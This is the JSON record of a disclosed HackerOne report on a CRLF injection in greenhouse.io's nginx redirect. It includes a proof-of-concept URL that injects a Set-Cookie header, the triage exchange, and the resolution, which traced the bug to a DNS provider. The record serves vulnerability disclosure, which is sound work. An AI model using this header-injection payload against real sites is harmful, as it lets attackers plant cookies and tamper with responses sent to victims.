{"id":25275,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTI3NQ==","url":"https://hackerone.com/reports/25275","title":"[greenhouse.io] CRLF Injection / Insecure nginx configuration","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-08-19T17:45:21.490Z","submitted_at":"2014-08-19T17:45:21.490Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":312,"url":"https://hackerone.com/greenhouse","handle":"greenhouse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/312/2b811c151c20eedf86c0458beeaa67210510235e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/312/2b811c151c20eedf86c0458beeaa67210510235e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Greenhouse.io","twitter_handle":"","website":"https://app.greenhouse.io","about":"Software to optimize your entire recruiting and onboarding process."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-11-02T13:27:21.114Z","bug_reporter_agreed_on_going_public_at":"2016-10-03T13:27:17.336Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC\r\nhttp://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io\r\n\r\nHTTP Response:\r\nLocation: http://www.greenhouse.io/\r\nSet-Cookie:test=test;domain=.greenhouse.io\r\n\r\nResult: \r\nCreating cookie test=test on .greenhouse.io\r\n\r\n$uri or $document_uri is used  in the redirection-URL.","vulnerability_information_html":"\u003cp\u003ePoC\u003cbr\u003e\n\u003ca title=\"http://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io\" href=\"/redirect?url=http%3A%2F%2Fgreenhouse.io%2F%250d%250aSet-Cookie%3Atest%3Dtest%3Bdomain%3D.greenhouse.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHTTP Response:\u003cbr\u003e\nLocation: \u003ca title=\"http://www.greenhouse.io/\" href=\"/redirect?url=http%3A%2F%2Fwww.greenhouse.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.greenhouse.io/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nSet-Cookie:test=test;domain=.greenhouse.io\u003c/p\u003e\n\n\u003cp\u003eResult: \u003cbr\u003e\nCreating cookie test=test on .greenhouse.io\u003c/p\u003e\n\n\u003cp\u003e$uri or $document_uri is used  in the redirection-URL.\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-11-02T13:27:17.387Z","allow_singular_disclosure_after":-131125508.97791407,"singular_disclosure_allowed":true,"vote_count":7,"voters":["bobrov","spam404","samincube","gamliel","madrobot","sumit7","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":111976,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"I've tested this a couple times, and the Set-Cookie header doesn't persist after the connection is redirected to www.greenhouse.io. I haven't been able to get the `test=test` cookie to show up in Firefox after creating a POC html file.\n\nCan you provide a POC html file?","markdown_message":"\u003cp\u003eI\u0026#39;ve tested this a couple times, and the Set-Cookie header doesn\u0026#39;t persist after the connection is redirected to \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.greenhouse.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.greenhouse.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. I haven\u0026#39;t been able to get the \u003ccode\u003etest=test\u003c/code\u003e cookie to show up in Firefox after creating a POC html file.\u003c/p\u003e\n\n\u003cp\u003eCan you provide a POC html file?\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-19T19:57:10.537Z","updated_at":"2014-08-19T19:57:10.537Z","actor":{"username":"mcclurmc","cleared":false,"url":"/mcclurmc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"greenhouse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":112359,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"CRLF Injection works only in redirection response from greenhouse.io to www.greenhouse.io.\nYou not need persist injection to create cookie value on domain *.greenhouse.io\n\n","markdown_message":"\u003cp\u003eCRLF Injection works only in redirection response from greenhouse.io to \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.greenhouse.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.greenhouse.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nYou not need persist injection to create cookie value on domain *.greenhouse.io\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-20T04:18:46.120Z","updated_at":"2014-08-20T04:18:46.120Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":15514,"filename":"poc1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/015/514/6904a8aaf44010ce146a23d4b2265743e3075c04/poc1.png?response-content-disposition=attachment%3B%20filename%3D%22poc1.png%22%3B%20filename%2A%3DUTF-8%27%27poc1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051226Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=f7968edc84e2b15ca0add93b6c0106c17046ff64d37989e38f95f4061dd3a8ad"},{"id":15513,"filename":"poc.html","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/015/513/efa19a4f7818f4258bd2d05bc878afea46ee0577/poc.html?response-content-disposition=attachment%3B%20filename%3D%22poc.html%22%3B%20filename%2A%3DUTF-8%27%27poc.html\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051226Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=968efe96b0f9c7193afc889fd61c7668acafa6cc35d0c2e10c982d64053f699d"},{"id":15515,"filename":"poc2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/015/515/e5d01cd9cfc79330fffa57b0d3b6c5cf4a1ca3b8/poc2.png?response-content-disposition=attachment%3B%20filename%3D%22poc2.png%22%3B%20filename%2A%3DUTF-8%27%27poc2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051226Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=9f4ad19769f80a8bf114fc41df008a70b75f7985daec96ffab0f91be37a097e0"}],"genius_execution_id":null,"team_handle":"greenhouse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":116539,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the explaination, @bobrov. We'll look into this as soon as we can.","markdown_message":"\u003cp\u003eThanks for the explaination, \u003ca href=\"/bobrov\"\u003e@bobrov\u003c/a\u003e. We\u0026#39;ll look into this as soon as we can.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-28T01:51:26.053Z","updated_at":"2014-08-28T01:51:26.053Z","actor":{"username":"mcclurmc","cleared":false,"url":"/mcclurmc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"greenhouse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":158565,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi bobrov, thanks for the report. This turned out to be an issue with our DNS provider's redirecting service. We raised the bug with them, and they have resolved the issue. Since this is a bug with a third-party service, it's not eligible for a bounty. All the same, we thank you for your report!","markdown_message":"\u003cp\u003eHi bobrov, thanks for the report. This turned out to be an issue with our DNS provider\u0026#39;s redirecting service. We raised the bug with them, and they have resolved the issue. Since this is a bug with a third-party service, it\u0026#39;s not eligible for a bounty. All the same, we thank you for your report!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-11-11T16:02:54.854Z","updated_at":"2014-11-11T16:02:54.854Z","actor":{"username":"mcclurmc","cleared":false,"url":"/mcclurmc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"greenhouse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1229064,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-03T13:27:17.356Z","updated_at":"2016-10-03T13:27:17.356Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"greenhouse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1280361,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-02T13:27:21.195Z","updated_at":"2016-11-02T13:27:21.195Z","actor":{"url":"/greenhouse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/312/2b811c151c20eedf86c0458beeaa67210510235e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Greenhouse.io"}},"genius_execution_id":null,"team_handle":"greenhouse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1391429,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-29T22:30:45.498Z","updated_at":"2016-12-29T22:30:45.498Z","actor":{"url":"/greenhouse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/312/2b811c151c20eedf86c0458beeaa67210510235e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Greenhouse.io"}},"genius_execution_id":null,"team_handle":"greenhouse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}